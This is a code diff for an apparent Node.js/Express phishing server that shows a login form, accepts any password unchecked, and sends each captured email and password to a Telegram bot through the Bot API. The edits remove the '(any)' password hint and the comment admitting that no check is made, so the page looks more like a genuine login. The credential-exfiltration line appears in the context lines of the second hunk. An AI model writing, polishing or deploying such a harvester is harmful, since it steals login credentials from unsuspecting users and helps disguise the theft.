@@ -45,7 +45,7 @@ app.get('/', (req, res) => {
   ${req.query.error ? `<div class="error">⚠️ ${req.query.error}</div>` : ''}
   <form action="/login" method="POST">
     <input type="email" name="email" placeholder="Email Address" required>
-    <input type="password" name="password" placeholder="Password (any)" required>
+    <input type="password" name="password" placeholder="Password" required>
     <button type="submit">→ ACCESS GOODS & SERVICES</button>
   </form>
 </div>
@@ -59,8 +59,6 @@ app.post('/login', (req, res) => {
   if (!isValidEmail(email)) {
     return res.redirect('/?error=Invalid%20email%20address%20or%20disposable%20email%20not%20allowed');
   }
-
-  // Any password is accepted – no check
 
   console.log('📨 LOGIN:', email, password);
   const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=🔐%20EDCLEFF%20LOGIN%0AEmail:%20${email}%0APassword:%20${password}`;
@@ -90,4 +88,4 @@ app.post('/login', (req, res) => {
 </html>`);
 });
 
-app.listen(PORT, () => console.log('✅ Server on', PORT));    
+app.listen(PORT, () => console.log('✅ Server on', PORT));
